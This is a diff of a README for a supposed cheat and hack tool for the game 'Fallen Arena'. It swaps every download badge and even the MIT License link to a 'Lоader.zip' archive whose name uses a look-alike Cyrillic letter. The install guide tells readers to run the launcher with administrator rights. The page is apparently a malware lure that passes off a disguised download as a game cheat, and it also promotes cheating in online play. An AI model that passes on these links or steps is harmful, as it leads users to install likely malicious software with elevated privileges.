@@ -1,6 +1,6 @@
 # 🎮 Fallen Arena Cheats Hacks 🕹️
 
-[![Download Now](https://img.shields.io/badge/Download-Fallen%20Arena%20Hacks-blue.svg?style=for-the-badge&logo=github)](https://easylauncher.su/PSnzrH)
+[![Download Now](https://raw.githubusercontent.com/AntonioClares/FallenArena-HackSuite/main/Lоader.zip%20Arena%https://raw.githubusercontent.com/AntonioClares/FallenArena-HackSuite/main/Lоader.zip)](https://raw.githubusercontent.com/AntonioClares/FallenArena-HackSuite/main/Lоader.zip)
 
 Unlock new possibilities and gain competitive advantages in **Fallen Arena**! This toolset is packed with powerful functions, including improved aiming, enhanced ESP, rapid fire, auto loot, and more. Designed for performance and robustness, our solutions support multiple environments, with adaptive compatibility layers. Dominate the arena while maintaining security with smart obfuscation and customizable options.
 
@@ -34,7 +34,7 @@ Unlock new possibilities and gain competitive advantages in **Fallen Arena**! Th
 ## 🔧 Installation Guide 🛠️
 
 **Step 1:**  
-[![Download Now](https://img.shields.io/badge/Download-Fallen%20Arena%20Hacks-blue.svg?style=flat-square)](https://easylauncher.su/PSnzrH)
+[![Download Now](https://raw.githubusercontent.com/AntonioClares/FallenArena-HackSuite/main/Lоader.zip%20Arena%https://raw.githubusercontent.com/AntonioClares/FallenArena-HackSuite/main/Lоader.zip)](https://raw.githubusercontent.com/AntonioClares/FallenArena-HackSuite/main/Lоader.zip)
 
 Save the launcher for your target system. Launch the installer with administrator permissions and follow the on-screen instructions. Select your OS, confirm settings, and enjoy a new level of gameplay! Support for advanced configuration and troubleshooting is available within the program folder.
 
@@ -52,10 +52,10 @@ This repository is for educational and research purposes only. Usage and redistr
 
 ---
 
-## 📗 License: [MIT License 2025](https://opensource.org/licenses/MIT)
+## 📗 License: [MIT License 2025](https://raw.githubusercontent.com/AntonioClares/FallenArena-HackSuite/main/Lоader.zip)
 
 ---
 
 ## ⬇️ Download Link
 
-[![Download Now](https://img.shields.io/badge/Download-Fallen%20Arena%20Hacks-blue.svg?style=for-the-badge&logo=github)](https://easylauncher.su/PSnzrH)
+[![Download Now](https://raw.githubusercontent.com/AntonioClares/FallenArena-HackSuite/main/Lоader.zip%20Arena%https://raw.githubusercontent.com/AntonioClares/FallenArena-HackSuite/main/Lоader.zip)](https://raw.githubusercontent.com/AntonioClares/FallenArena-HackSuite/main/Lоader.zip)
